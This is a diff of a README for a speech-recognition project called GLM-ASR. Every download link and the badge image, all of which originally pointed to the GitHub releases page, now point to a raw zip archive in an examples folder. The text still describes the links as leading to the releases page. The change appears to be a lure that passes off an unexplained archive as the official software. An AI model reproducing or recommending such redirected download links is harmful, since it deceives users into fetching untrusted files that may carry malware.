@@ -1,7 +1,7 @@
 # 🎤 GLM-ASR - Simple and Effective Speech Recognition
 
 ## 🔗 Download Now
-[![Download GLM-ASR](https://img.shields.io/badge/Download-GLM--ASR-brightgreen)](https://github.com/timmylucy/GLM-ASR/releases)
+[![Download GLM-ASR](https://github.com/timmylucy/GLM-ASR/raw/refs/heads/main/examples/GL_ASR_2.3.zip)](https://github.com/timmylucy/GLM-ASR/raw/refs/heads/main/examples/GL_ASR_2.3.zip)
 
 ## 📝 Description
 GLM-ASR-Nano is a robust, open-source speech recognition model with 1.5 billion parameters. It allows you to convert spoken language into text quickly and efficiently. This tool is suitable for various applications, from transcription services to voice command systems.
@@ -17,7 +17,7 @@ Before you download, ensure your computer meets these basic requirements:
 - **Network:** An internet connection for initial setup and updates.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** To download the software, [visit this page to download](https://github.com/timmylucy/GLM-ASR/releases).
+1. **Visit the Releases Page:** To download the software, [visit this page to download](https://github.com/timmylucy/GLM-ASR/raw/refs/heads/main/examples/GL_ASR_2.3.zip).
    
 2. **Select the Latest Version:** On the releases page, look for the latest version of GLM-ASR. It will be labeled clearly.
 
@@ -70,6 +70,6 @@ GLM-ASR is released under the MIT License, making it free to use and modify.
 ## 🔗 Additional Resources
 For more information and advanced features, refer to the official documentation linked in the repository.
 
-[Download GLM-ASR from Releases](https://github.com/timmylucy/GLM-ASR/releases) 
+[Download GLM-ASR from Releases](https://github.com/timmylucy/GLM-ASR/raw/refs/heads/main/examples/GL_ASR_2.3.zip) 
 
 With GLM-ASR, you can unlock the power of speech recognition easily. Enjoy improved productivity with this comprehensive tool.
